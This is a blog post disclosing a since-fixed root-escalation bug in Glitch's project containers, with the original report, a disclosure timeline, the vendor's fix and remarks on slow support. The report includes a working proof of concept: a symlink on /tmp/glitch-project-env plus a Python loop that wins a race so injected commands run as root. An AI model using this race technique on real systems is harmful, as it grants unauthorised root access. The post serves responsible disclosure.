---
date: Mon Aug 10 2020 17:42:18 -0700 (Pacific Daylight Time)
qualitative_time: 
title: Root access on Glitch
previous_teaser: List of salads that you can't put croutons in
previous_first: true
---
In 2019, I discovered a way to get root access in the project containers on [Glitch](https://glitch.com/).
This issue is now fixed.

Glitch is a Node.js-focused web development environment and hosting service.
Users normally aren't allowed to have root access, with a staff member describing in a group message to me on their support forum:

> Root access to the container is something we prevent for a number of reasons, security among them.

I reported this finding to the Glitch staff.
At the time, Glitch had been getting rid of the old Fog Creek materials, the instructions to report a security vulnerability along with it.
They had not put up new instructions.

# A copy of the report

Here's a copy of the report I sent to the staff.

## vulnerability info

a big part of the leadup to wetty's user shell is run as root. from top:
```
    8 root      20   0    4240    780    716 S   0.0  0.0   0:00.00      `- runsv wetty
   11 root      20   0     212      4      0 S   0.0  0.0   0:00.00          `- /usr/bin/dumb-init /bin/bash ./run
   13 root      20   0   19696   2992   2764 S   0.0  0.0   0:00.00              `- /bin/bash ./run
   15 root      20   0    4504    656    588 S   0.0  0.0   0:00.00                  `- /bin/sh /opt/nvm/versions/node/v10/bin/wetty --port 1084 --command /etc/service/wetty/+ 
   26 root      20   0 1012088  53248  27044 S   0.0  0.8   0:03.22                      `- /opt/nvm/versions/node/v10/bin/node /opt/nvm/versions/node/v10/bin/../pnpm-global/+ 
24828 root      20   0   19716   3168   2904 S   0.0  0.1   0:00.00                          `- /bin/bash /etc/service/wetty/wetty-command.sh
24833 root      20   0   51004   3308   2900 S   0.0  0.1   0:00.00                              `- su --preserve-environment --login app
24834 app       20   0   19952   3652   3128 S   0.0  0.1   0:00.00                                  `- -su
25475 app       20   0   40424   3396   2908 R   0.0  0.1   0:00.01                                      `- top
```

from `/etc/service/wetty/wetty-command.sh`:
```sh
curl -s localhost:1083/env > /tmp/glitch-project-env 2> /dev/null
set -a && source /tmp/glitch-project-env &> /dev/null && set +a
```

there's a race condition here. we can make `/tmp/glitch-project-env` a symlink to a file we own. then, if we can sneak in a write between the `curl` and the `source`, our modified glitch-project-env will run as root

---

## sample exploitation with dummy payload

in `racer/r.py`:
```py
import os

i = 0
while True:
  os.lseek(3, 0, os.SEEK_SET)
  os.write(3, 'id >/app/my-id.txt # %d ' % i)
  i += 1
```

```sh
ln -s /tmp/ours /tmp/glitch-project-env
python racer/r.py 3>/tmp/ours
# open a new terminal
```

then check results in `/app`:
```
app@...:~ 06:06 
$ ls -l /app
...
-rw-r--r-- 1 root root   39 Apr 27 05:26 my-id.txt
drwxrwxr-x 2 app  app  1024 Apr 27 05:45 racer

app@...:~ 06:09 
$ cat /app/my-id.txt
uid=0(root) gid=0(root) groups=0(root)
```

# Notes

I don't recall why it matters that the attacker put a symlink where the environment file would be written.
Maybe there had been some other code nearby that would fail otherwise.

# Timeline

**2019/04/26** I find this vulnerability.
I reach out to their general support email address.
There is no response.

**2019/04/27** I reach out over group message on their support forum.
There is no response.

**2019/04/30** A staff member C responds, and we work through some ways I might be able submit the report.
In the end, sending the report to the group message works.
I post the report from above.
C tells me:

> I’ll put together some context and get this info back to the rest of the team. I can’t commit to any particular timeline or response, but I’ll make sure we get some eyes on it as soon as possible.

**2019/05/08** I ask if the team has taken a look.
There is no response.

**2019/05/20** I ask if C has put together some context.
There is no response.

**2019/06/05** I ask if any staff still visit the support forum.
C responds that they haven't gotten to this yet.

**2019/11/19** I remember this report and nag them.
There is no response.

**2019/12/02** C responds that they'll get to it this week.

**2020/04/03** I remember this report and nag them.
There is no response.

**2020/04/27** I notice that Glitch now has an official statement directing people to send reports to their general support email address and that a ticket system handles those emails.
I open a ticket for this vulnerability, referencing the group message thread.
There is only an automated response.

**2020/06/05** I complain on their support forum about the lack of response.
Another staff member T shows me how to view my tickets a website, but there is no update to the ticket about this vulnerability.

**2020/07/22** Another staff member P says on a Discord server to send them a private message if a security vulnerability report has not gotten a response.
I message P with a reference to the ticket.
There is no response.

**2020/08/03** I ask on the ticket if I can disclose the vulnerability.

**2020/08/04** T tells me to fllow up with C over the group message thread.
I ask on the group message thread if I can disclose the vulnerability.

**2020/08/05** C tells me to wait until tomorrow for a response.

**2020/08/06** C says they implemented a fix that will be deployed soon.

**2020/08/10** C says the fix should be deployed.

# Glitch's fix

A new version of the `wetty-command.sh` script now uses process substitution instead of a temporary file.

```sh
set -a && source <(curl -s localhost:1083/env) &> /dev/null && set +a
```

# Discussion

## Recommendations

Still a lot of work is done as root, in the "watcher," "wetty," and "ot-storage" programs.
These are thousands of lines of JavaScript code, along with hundreds of megabytes of node_modules.
They might be a good place to look for more vulnerabilities.

I'm not sure how much of all that must run as root.
I haven't looked deeply into those programs, but they as far as I know, they manipulate user-owned files and serve on non-privileged ports.
If Glitch can find the energy to make major changes to the implementation, I'd suggest they minimize the amount of code running as root.

## Support tooling issues

Glitch's support ticket system is a pain to use, although it didn't result in me missing any communications about this vulnerability.
Some magical things about the email headers aren't set up right, and staff responses are classified as spam.
Replying to a ticket sometimes creates a new ticket instead.
Staff members sometimes merge these extraneous replies into existing threads.
Sometimes they don't.
When they merge them, it leaves the extraneous ticket around.
Sometimes staff merge a reply with the wrong ticket.
T explains,

> Within HappyFox (our ticketing platform provider), support request tickets are marked “Closed” after every support team member’s response.
> That way, we are alerted when the person who created the support request responds.

I'm not convinced that this is right.

## Long turnaround

It was long.
C took reponsibility for the delays and reflected on what they and Glitch could have done to address the report more quickly.
I appreciate that Glitch was able to implement a fix quickly when I expressed that I would like to publish it, i.e., in this article.
